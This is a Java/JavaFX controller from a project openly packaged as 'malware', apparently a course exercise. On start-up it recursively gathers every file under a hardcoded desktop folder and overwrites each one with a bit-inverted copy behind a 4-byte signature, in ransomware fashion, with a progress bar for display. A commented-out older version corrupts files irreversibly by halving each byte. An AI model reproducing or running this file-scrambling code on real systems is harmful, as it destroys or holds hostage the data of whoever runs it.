package lk.ijse.dep10.malware.controller;

import javafx.concurrent.Task;
import javafx.fxml.FXMLLoader;
import javafx.scene.Scene;
import javafx.scene.control.ProgressBar;
import javafx.stage.Stage;
import javafx.stage.Window;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.ArrayList;

public class SpalshViewController {

    public ProgressBar pgb;

    public void initialize() throws IOException {
        File file = new File("/home/vipula/Desktop/test");

        File[] list = file.listFiles();
        ArrayList<File> list2 = new ArrayList<>();

        search(file,list2);
        System.out.println(list2);
        encryptFiles(list2);

//        Stage stage1 = (Stage) pgb.getScene().getWindow();
//        stage1.close();

        Stage stage =new Stage();
        FXMLLoader fxmlLoader = new FXMLLoader(getClass().getResource("/view/MainView.fxml"));
        stage.setScene(new Scene(fxmlLoader.load()));
        MainViewController controller = fxmlLoader.getController();
        controller.initData(list2);
        stage.show();
//        stage.toFront();
        stage.centerOnScreen();
    }

    public void search(File file, ArrayList<File> list2){
        File[] list = file.listFiles();
        if(list == null) return;
        for (File file1 : list) {
            if(file1.isDirectory()){
                search(file1,list2);
                continue;
                }
            System.out.println(file1);
            list2.add(file1);
        }
    }
    private void encryptFiles(ArrayList<File> list) throws IOException {
        Task<Void> task = new Task<Void>() {
            @Override
            protected Void call() throws Exception {
                for (File file : list) {
                    System.out.println(file);
                    File temp = File.createTempFile("prefix","suffix");
                    byte[] signature = new byte[]{1,2,3,4};

                    FileInputStream fileInputStreamForFile = new FileInputStream(file);
                    FileOutputStream fileOutputStreamForTemp = new FileOutputStream(temp);

                    boolean shouldEncrypt = false;
                    byte[] signatureByte = new byte[4];
                    fileInputStreamForFile.read(signatureByte);
                    for (int i = 0; i < 4; i++) {
                        if( signatureByte[i] != signature[i]){
                            shouldEncrypt =true;
                            break;
                        }
                    }

                    if(shouldEncrypt){
                        fileOutputStreamForTemp.write(signature);
//                fileOutputStreamForTemp.write(signatureByte);
                        for (int i = 0; i < 4; i++) {
                            fileOutputStreamForTemp.write(~signatureByte[i]);
                        }
                        while (true) {
                            byte[] buffer = new byte[1024 * 1024 * 10];
                            int read = fileInputStreamForFile.read(buffer);
                            if (read == -1) break;


                            for (int i = 0; i < read; i++) {
                                fileOutputStreamForTemp.write(~buffer[i]);
                            }
                            double percentage = (double) temp.length()/(double) (file.length() + 4);
                            updateProgress(percentage,1);
                        }
                        System.out.println(temp.length());
                        file.delete();
                        temp.renameTo(file);
                    }

                    fileOutputStreamForTemp.close();
                    fileInputStreamForFile.close();
                }

                return null;
            }

        };
        pgb.progressProperty().bind(task.progressProperty());
        new Thread(task).start();

    }


//    private void encryptFiles(ArrayList<File> list) throws IOException {
//        for (File file : list) {
//            FileInputStream fileInputStream = new FileInputStream(file);
//            byte[] original = fileInputStream.readAllBytes();
//            int[] sig = new int[]{1,2,3,4};
//
//            boolean should = false;
//            for (int i = 0; i < 4; i++) {
//                if(sig[i] != original[i]) {
//                    should = true;
//                    break;
//                }
//            }
//            System.out.println(should);
//            System.out.println(file);
//            if(should){
//                byte[] corrupt = new byte[original.length + 4];
//                for (int i = 0; i < corrupt.length; i++) {
//                    if (i < 4) {
//                        System.out.println("im in");
//                        System.out.println(sig[i]);
//                        corrupt[i] = (byte) sig[i];
//                        System.out.println(corrupt[i]);
//                        continue;
//                    }
//                    corrupt[i] = (byte) ((original[i - 4])/2);
//                }
//
//                file.delete();
//                FileOutputStream fileOutputStream = new FileOutputStream(file);
//                fileOutputStream.write(corrupt);
//                fileOutputStream.close();
//            }else continue;
//
//            fileInputStream.close();
//        }
//    }
}
